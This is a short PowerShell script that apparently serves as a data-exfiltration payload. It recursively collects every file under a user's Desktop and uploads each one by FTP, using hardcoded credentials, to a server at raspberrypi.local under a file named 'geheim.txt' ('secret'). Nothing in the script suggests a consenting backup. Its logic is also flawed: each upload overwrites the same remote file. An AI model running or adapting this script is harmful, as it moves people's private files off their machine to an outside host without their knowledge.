# Config
$Username = "ftpuser"
$Password = "ftppass"
$dir = "C:\Users\testo\Desktop\"
$RemoteFile = "ftp://raspberrypi.local/$env:computername/geheim.txt"

$filelist = [string[]] (Get-ChildItem -Path $dir+"*.*" -Recurse)

echo $filelist

foreach($LocalFile in $filelist){
  # Create FTP Rquest Object
  $FTPRequest = [System.Net.FtpWebRequest]::Create("$RemoteFile")
  $FTPRequest = [System.Net.FtpWebRequest]$FTPRequest
  $FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
  $FTPRequest.Credentials = new-object System.Net.NetworkCredential($Username, $Password)
  $FTPRequest.UseBinary = $true
  $FTPRequest.UsePassive = $true
  # Read the File for Upload
  $FileContent = gc -en byte $LocalFile
  $FTPRequest.ContentLength = $FileContent.Length
  # Get Stream Request by bytes
  $Run = $FTPRequest.GetRequestStream()
  $Run.Write($FileContent, 0, $FileContent.Length)
  # Cleanup
  $Run.Close()
  $Run.Dispose()
}
